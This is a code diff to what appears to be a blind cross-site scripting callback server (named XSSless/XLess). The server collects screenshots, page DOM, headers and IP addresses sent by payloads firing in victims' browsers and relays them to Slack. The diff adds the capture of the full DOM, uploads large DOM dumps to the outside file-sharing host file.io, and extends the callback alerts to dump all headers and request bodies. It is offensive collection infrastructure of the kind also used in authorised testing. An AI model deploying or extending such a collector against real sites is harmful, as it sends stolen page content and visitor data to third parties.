@@ -36,9 +36,9 @@ function generate_blind_xss_alert(body) {
   for( let k of Object.keys(body)) {
     if (k === "Screenshot") {
       continue
+    }else if(k === "DOM"){
+      continue
     }
-
-
     if (body[k] === "") {
       alert += "*"+k+":* " + "```None```" + "\n"
     } else {
@@ -49,14 +49,34 @@ function generate_blind_xss_alert(body) {
 }
 
 
-function generate_callback_alert(headers, data, url) {
-  var alert = "*XSSless: Out-of-Band Callback Alert*\n"
-  alert += `• *IP Address:* \`${data["Remote IP"]}\`\n`
-  alert += `• *User-Agent:* \`${headers["user-agent"]}\`\n`
-  alert += `• *Request URI:* \`${url}\`\n`
-  if (headers["referer"] !== undefined) {
-    alert += `• *Referer:* \`${headers["referer"]}\`\n`
+function generate_callback_alert(request, headers, data, url) {
+  var alert = "*XSSless: Out-of-Band Callback Alert*\n";
+  alert += "The request was received from IP address `"+data["Remote IP"]+"`. More info: `http://www.ip-tracker.org/locator/ip-lookup.php?ip="+data["Remote IP"]+"`\n"
+  const headers_str = JSON.stringify(headers)
+  const heads = JSON.parse(headers_str)
+  alert += "```"+ request.method +" "+ url +" HTTP/"+request.httpVersion+"\n"
+  for(var keys in heads){
+	switch(keys){
+		case("x-vercel-deployment-url"):
+		case("x-vercel-forwarded-for"):
+		case("x-vercel-id"):
+			continue
+	}
+	alert += keys+": "+heads[keys]+"\n"
   }
+  if (headers["Referer"] !== undefined) {
+    alert += "referer: "+ headers["referer"] +"\n"
+  }
+  if (request.body !== undefined) {
+     if(request.method != 'GET' && request.method != 'HEAD'){
+	delete request.body["Remote IP"]
+    	const datas = JSON.stringify(request.body)
+    	alert += "\n"
+    	alert += datas
+    	alert += "\n"
+     }
+  }
+  alert += "```"
   return(alert)
 }
 
@@ -119,13 +139,35 @@ app.all("/message", (req, res) => {
   });
 })
 
+async function htmlUpload(html){
+	return new Promise(function(resolve, reject){
+		const rekwest = {
+			method: "POST",
+			url: "https://file.io/?expires=1w",
+			port: 443,
+			headers: {
+            			"Content-Type": "application/x-www-form-urlencoded"
+        		},
+			formData : {
+				"text": html
+			}
+		}
+
+		request(rekwest, function(err, success){
+			if(err){
+				reject(err)
+			}else{
+				resolve(success)
+			}
+		})
+	})
+}
 
 app.post("/c", async (req, res) => {
     let data = req.body
 
     // Upload our screenshot and only then send the Slack alert
     data["Screenshot URL"] = ""
-
     if (imgbb_api_key && data["Screenshot"]) {
       const encoded_screenshot = data["Screenshot"].replace("data:image/png;base64,","")
 
@@ -139,11 +181,26 @@ app.post("/c", async (req, res) => {
           // Add the URL to our data array so it will be included on our Slack message
           data["Screenshot URL"] = imgOut.data.url_viewer
         }
-      }
-      catch (e) {
+      }catch (e) {
         data["Screenshot URL"] = e.message
       }
     }
+   data["HTML Data"] = ""
+   if(data["DOM"].length >= 2500){
+	try {
+		const success = await htmlUpload(data["DOM"].replace(/\n/g,''))
+		const htmlFinal = JSON.parse(success.body)
+		if(htmlFinal.message == "Not Found"){
+			data["HTML Data"] = "Not Found"
+		}else if(htmlFinal.link){
+			data["HTML Data"] = `${htmlFinal.link}`
+		}
+	}catch(e) {
+		data["HTML Data"] = e.message
+	}
+   }else{
+	data["HTML Data"] = data["DOM"]
+   }
 
     // Now handle the regular Slack alert
     data["Remote IP"] = req.headers["x-forwarded-for"] || req.connection.remoteAddress
@@ -197,7 +254,7 @@ app.all("/*", (req, res) => {
   var headers = req.headers
   var data = req.body
   data["Remote IP"] = req.headers["x-forwarded-for"] || req.connection.remoteAddress
-  const alert = generate_callback_alert(headers, data, req.url)
+  const alert = generate_callback_alert(req, headers, data, req.url)
   data = {form: {"payload": JSON.stringify({"username": "XLess", "mrkdwn": true, "text": alert}) }}
 
   request.post(slack_incoming_webhook, data, (out)  => {
